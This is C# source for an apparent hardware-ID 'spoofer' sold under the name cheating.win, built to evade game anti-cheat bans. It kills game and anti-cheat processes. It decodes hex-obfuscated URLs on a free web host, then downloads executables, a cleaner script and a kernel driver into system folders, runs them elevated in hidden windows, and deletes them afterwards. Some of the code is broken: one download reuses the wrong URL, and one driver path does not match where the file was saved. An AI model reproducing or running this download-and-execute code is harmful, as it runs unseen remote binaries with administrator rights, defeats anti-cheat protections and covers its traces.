using Null_Obfuscator.Outline;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EasyAntiCheatOverlay
{
    class Program
    {


		private static void WriteCons(string input)
		{
			Console.ForegroundColor = ConsoleColor.Blue;
			Console.Write("   [");
			Console.ForegroundColor = ConsoleColor.Green;
			Console.Write("c");
			Console.ForegroundColor = ConsoleColor.DarkRed;
			Console.Write(".");
			Console.ForegroundColor = ConsoleColor.Yellow;
			Console.Write("w");
			Console.ForegroundColor = ConsoleColor.Magenta;
			Console.Write("i");
			Console.ForegroundColor = ConsoleColor.Cyan;
			Console.Write("n");
			Console.ForegroundColor = ConsoleColor.DarkGreen;
			Console.Write("] ");
			Console.ForegroundColor = ConsoleColor.White;
			Console.WriteLine(input);
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002280 File Offset: 0x00000480
		private static void Loop()
		{
			Console.Title = "cheating.win spoofer // " + SecureRandoms.GenerateRandomString(69);
			Thread.Sleep(90);
		    Loop();
		}

		static void KillProcess(string proc)
        {
			Process[] ps = Process.GetProcessesByName(proc);

			foreach (Process p in ps)
				p.Kill();
		}
		static void EndProcs()
        {
			// fortnite
			Console.WriteLine();
			WriteCons("Starting Process Terminination.");
			Thread.Sleep(4000);
			Console.WriteLine();
			WriteCons("checking if fn is running on host machine.");
			Thread.Sleep(3000);
			Process[] fn = Process.GetProcessesByName("FortniteClient-Win64-Shipping");
			if (fn.Length > 0)
			{
				WriteCons("fn found running on host machine.");
				Thread.Sleep(1000);
				WriteCons("killing fn to prevent detections with driver.");
				KillProcess("FortniteClient-Win64-Shipping");
			}


			if (fn.Length == 0)
			{
				WriteCons("fn was not found running on host machine.");
			}
			// end fn



			Console.WriteLine();
			Thread.Sleep(1500);

			//vanguard
			WriteCons("checking if vanguard is running on host machine.");
			Thread.Sleep(3000);
			Process[] vanguard = Process.GetProcessesByName("vgtray");
			if (vanguard.Length > 0)
			{
				WriteCons("vanguard found running on host machine.");
				Thread.Sleep(1000);
				WriteCons("killing vanguard to prevent detections with driver.");
				KillProcess("vgtray");
			}


			if (vanguard.Length == 0)
			{
				WriteCons("vanguard was not found running on host machine.");
			}

			//end vanguard


			Console.WriteLine();
			Thread.Sleep(1500);


			//battle-eye
			WriteCons("checking if epic games launcher is running on host machine.");
			Thread.Sleep(3000);
			Process[] eg = Process.GetProcessesByName("EpicGamesLauncher");
			if (eg.Length > 0)
			{
				WriteCons("epic games found running on host machine.");
				Thread.Sleep(1000);
				WriteCons("killing epic games launcher to prevent detections with driver.");
				KillProcess("EpicGamesLauncher");
			}


			if (eg.Length == 0)
			{ 
				WriteCons("epic games launcher was not found running on host machine.");
			}
			//battle-eye end

		

		}



		static string GetCleanHex(string hex)
		{
			string legalCharacters = "0123456789ABCDEF";
			string result = hex.ToUpper();
			foreach (char c in result)
			{
				if (!legalCharacters.Contains(c))
					result = result.Replace(c.ToString(), string.Empty);
			}
			return result;
		}

		static private byte[] GetBytesFromHex(string hex)
		{
			byte[] bytes = new byte[hex.Length / 2];
			for (int i = 0; i < bytes.Length; i++)
				bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
			return bytes;
		}


		static void SpoofSMBIOS()
		{
			WebClient wb = new WebClient();
			string hex3 = GetCleanHex("68 74 74 70 73 3A 2F 2F 39 30 33 6E 62 67 76 30 39 73 61 65 6B 33 34 6A 2E 30 30 30 77 65 62 68 6F 73 74 61 70 70 2E 63 6F 6D 2F 63 2E 77 69 6E 2F 53 70 6F 6F 66 46 69 78 5F 31 2E 65 78 65");
			byte[] bytes3 = GetBytesFromHex(hex3);
			string text3 = Encoding.ASCII.GetString(bytes3);
			wb.DownloadFile(text3, @"C:\Windows\System32\c.win.bios.exe");



			Process proc2 = new Process();
			proc2.StartInfo.CreateNoWindow = true;
			proc2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			proc2.StartInfo.FileName = @"C:\Windows\System32\c.win.bios.exe";
			proc2.StartInfo.UseShellExecute = true;
			proc2.StartInfo.Verb = "runas";
			proc2.Start();
			proc2.WaitForExit();


			File.Delete(@"C:\Windows\System32\c.win.bios.exe");

			string hex33 = GetCleanHex("68 74 74 70 73 3A 2F 2F 39 30 33 6E 62 67 76 30 39 73 61 65 6B 33 34 6A 2E 30 30 30 77 65 62 68 6F 73 74 61 70 70 2E 63 6F 6D 2F 63 2E 77 69 6E 2F 61 6D 69 64 65 2E 65 78 65");
			byte[] bytes33 = GetBytesFromHex(hex3);
			string text33 = Encoding.ASCII.GetString(bytes3);
			wb.DownloadFile(text33, @"C:\Windows\System32\c.win.branding.exe");

			Process proc22 = new Process();
			proc22.StartInfo.CreateNoWindow = true;
			proc22.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			proc22.StartInfo.FileName = @"C:\Windows\System32\c.win.branding.exe";
			proc22.StartInfo.UseShellExecute = true;
			proc22.StartInfo.Verb = "runas";
			proc22.Start();
			proc22.WaitForExit();


			File.Delete(@"C:\Windows\System32\c.win.branding.exe");
		}

		static void SpoofDisk()
		{
			WebClient wb = new WebClient();
			string hex = GetCleanHex("68 74 74 70 73 3A 2F 2F 39 30 33 6E 62 67 76 30 39 73 61 65 6B 33 34 6A 2E 30 30 30 77 65 62 68 6F 73 74 61 70 70 2E 63 6F 6D 2F 63 2E 77 69 6E 2F 6D 61 70 2E 65 78 65");
			byte[] bytes = GetBytesFromHex(hex);
			string text = Encoding.ASCII.GetString(bytes);

			string hex2 = GetCleanHex("68 74 74 70 73 3A 2F 2F 39 30 33 6E 62 67 76 30 39 73 61 65 6B 33 34 6A 2E 30 30 30 77 65 62 68 6F 73 74 61 70 70 2E 63 6F 6D 2F 63 2E 77 69 6E 2F 64 72 69 62 61 2E 73 79 73");
			byte[] bytes2 = GetBytesFromHex(hex2);
			string text2 = Encoding.ASCII.GetString(bytes2);

			wb.DownloadFile(text, @"C:\Windows\System32\c.win.map.exe");
			wb.DownloadFile(text2, @"C:\Windows\IME\c.win.driver.sys");
			Process proc = new Process();
			proc.StartInfo.CreateNoWindow = true;
			proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			proc.StartInfo.FileName = @"C:\Windows\System32\c.win.map.exe";
			proc.StartInfo.Arguments = @"C:\Windows\System32\c.win.driver.sys";
			proc.StartInfo.UseShellExecute = true;
			proc.StartInfo.Verb = "runas";
			proc.Start();
			proc.WaitForExit();

			File.Delete(@"C:\Windows\System32\c.win.map.exe");
			File.Delete(@"C:\Windows\System32\c.win.driver.sys");
		}

		static void Clean()
		{
			WebClient wb = new WebClient();
			string hex = GetCleanHex("68 74 74 70 73 3A 2F 2F 39 30 33 6E 62 67 76 30 39 73 61 65 6B 33 34 6A 2E 30 30 30 77 65 62 68 6F 73 74 61 70 70 2E 63 6F 6D 2F 63 2E 77 69 6E 2F 63 6C 65 61 6E 65 72 2E 62 61 74");
			byte[] bytes = GetBytesFromHex(hex);
			string text = Encoding.ASCII.GetString(bytes);

			wb.DownloadFile(text, @"C:\Windows\System32\c.win.cleaner.bat");
			Process proc = new Process();
			proc.StartInfo.FileName = @"C:\Windows\System32\c.win.cleaner.bat";
			proc.StartInfo.UseShellExecute = true;
			proc.StartInfo.Verb = "runas";
			proc.Start();
			proc.WaitForExit();

			File.Delete(@"C:\Windows\System32\c.win.cleaner.bat");
		}



		static void Main(string[] args)
        {
			Thread loop = new Thread(new ThreadStart(Loop));
			loop.Start();
			Thread.Sleep(1000);
			EndProcs();
			Thread.Sleep(2300);
			Console.Clear();



		     bool disk = false;
			bool bios  = false;
			bool reg = false;



			Console.Clear();
			DialogResult diskdrive = MessageBox.Show("Spoof Diskdrive ?", SecureRandoms.GenerateRandomAddress(9), MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
			if (diskdrive == DialogResult.Yes)
			{
				disk = true;
				WriteCons("Diskdrive = true");
			}
			if (diskdrive == DialogResult.No)
			{
				disk = false;
				WriteCons("Diskdrive = false");
			}


			DialogResult smbios = MessageBox.Show("Spoof SMBIOS ?", SecureRandoms.GenerateRandomAddress(9), MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
			if (smbios == DialogResult.Yes)
			{
				bios = true;
				WriteCons("SMBIOS = true");
			}
			if (smbios == DialogResult.No)
			{
				bios = false;
				WriteCons("SMBIOS = false");
			}


			DialogResult registry = MessageBox.Show("Clean ?", SecureRandoms.GenerateRandomAddress(9), MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
			if (registry == DialogResult.Yes)
			{
				reg = true;
				WriteCons("Clean = true");
			}
			if (registry== DialogResult.No)
			{
				reg = false;
				WriteCons("Clean = false");
			}


			Thread.Sleep(4200);
			Console.WriteLine();
			WriteCons("Starting Spoof Process.");
			WebClient wb = new WebClient();
			if (disk == true)
            {
				SpoofDisk();
			}
			if (bios == true)
            {
				SpoofSMBIOS();
            }		
			if (reg == true)
            {
				Clean();
			}

			Console.WriteLine("Spoof Success");


			Thread.Sleep(1800);
			Thread.Sleep(-1);
		}
    }
}
